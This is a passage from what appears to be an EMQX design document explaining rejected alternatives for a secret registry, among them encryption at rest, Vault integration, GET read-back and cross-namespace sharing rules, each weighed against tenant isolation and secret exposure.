so any rule with tracing enabled records the resolved secret value
verbatim in log lines. There is no way to ensure redaction across
every consumer of an SQL function's return because the function does
not know its caller's logging context. The placeholder, by being a
distinct lexical token recognised by the renderer, can be
special-cased uniformly across every render code path, and is the
preferred path for the common "interpolate credential into outbound
header / body / URL" use case.

We do ship `get_secret/1` as an escape hatch for the cases where the
secret value needs to participate in an SQL expression (HMAC-signing
a payload, composing a header value from multiple SQL inputs, etc.).
See the "Rule SQL function `get_secret(<name>)`" design section for
the documented trace-exposure caveat.

### Encryption at rest with a master key

Considered: encrypt secret values in mnesia using a master key
configured via env var or HSM. Rejected for v1: this requires master
key management, key rotation policies, and a recovery procedure for
"lost master key, regenerate registry" scenarios. Filesystem-level
encryption (LUKS, AWS EBS encryption, GCP persistent disk
encryption) provides the at-rest property without adding key
management to EMQX's surface area. Mention as a possible v2.

### Vault / AWS Secrets Manager / external broker integration

Considered: instead of (or in addition to) a built-in registry,
support fetching secrets from external secret brokers at render
time. Rejected for v1 on two grounds: it expands the surface area
significantly (broker plugins, credential management for the broker
connection, timeout / cache semantics for slow brokers, error
handling for "broker reachable but secret missing" vs "broker
unreachable"), and it shifts the operational model from "EMQX is
self-contained" to "EMQX has a hard runtime dependency on an
external secret service." Operators who want Vault-backed secrets
can run a Vault Agent sidecar that templates a HOCON file containing
`emqx_secret_registry` CRUD calls and re-applies on rotation.

### Returning the value via GET

Considered: allow `GET /api/v5/secrets/{name}` to
return the value to an operator with sufficient privilege. Rejected,
though for narrower reasons than one might first assume. It is *not*
rejected to preserve a "configure but cannot read" boundary — no such
boundary exists (see "Security model: reference implies disclosure").
It is rejected because keeping read-back uniformly disabled (a) keeps
plaintext secrets out of one more egress surface — API responses, and
their proxy / gateway / browser-history trail — reinforcing the
at-rest exposure reduction that *is* the feature's value, and (b)
keeps the audit story crisp: "did any operator read this secret over
the API" is uniformly answerable as "no," with disclosure occurring
only through the referencing paths that already carry it. Rotation is
the rotation path; an operator who needs the value elsewhere should
store their own copy.

### Cross-scope sharing — the shape adopted, and the ones declined

The design adopts exactly one cross-scope path: a namespaced reference
may fall back to a **global** secret marked `share_ns = true` (see
"Resolution"). The load-bearing observation throughout is that
**referencing a secret is equivalent to reading its value** (see
"Security model: reference implies disclosure") — a tenant who can
reference a secret in a resource they control can render it to an
endpoint they control and read it off the wire. So `share_ns = true`
is *not* a "reference but not read" grant — no such thing exists — but
an explicit decision to disclose a global secret's value to every
namespace administrator. Several richer or different shapes were
considered and declined for v1:

1. **Namespace→global fallback with no opt-out** — the shape of an
   earlier draft: any namespaced miss falls through to global
   unconditionally. Rejected because it discloses every global secret
   to every tenant with no way to hold one back; a name-guess from any
   namespace would exfiltrate any global secret. The per-secret,
   opt-in `share_ns` (default `false`) restores that control — a global
   secret is unreachable from and unlisted to every namespace until an
   operator deliberately marks it `share_ns = true`, so the credential
   that was never meant to be tenant-facing stays private by default.
2. **Per-namespace allowlist** — a global secret carries the list of
   namespaces it is offered to ("share to these tenants only"). This
   is the *honest, targeted* form of disclosure and the natural
   successor to the coarse `share_ns` boolean, but it adds a
   cross-namespace ACL that must stay consistent across namespace
   lifecycle, for a use case ("one credential shared to some tenants,
   rotated once") not yet asked for. Deferred; `share_ns = true` is
   its all-or-nothing zero case and forward-compatible with it (a
   future allowlist can treat `share_ns = true` as "all namespaces"),
   so shipping the boolean now does not invalidate stored data later.
3. **Global→namespace and sibling-namespace resolution.** Rejected
   outright, in any version. Letting a global configuration resolve a
   namespace's secret would feed a tenant-controlled value into a
   broker-wide code path; letting one namespace resolve another's
   breaks tenant isolation with no use case. Only namespace→global
   (shareable) crosses a boundary.

### Allowing the placeholder in MQTT topics and payloads

Considered: permit `$secret{...}` in rule republish topic / payload
templates. Rejected: no compelling use case (the placeholder is for
*outbound* credentials to backends, not for shaping MQTT-protocol
content), and significant downside (audit logs of published
messages would either need to special-case secrets or risk leaking).
Easier to reject at config-validation time than to retrofit
redaction across the MQTT logging path.
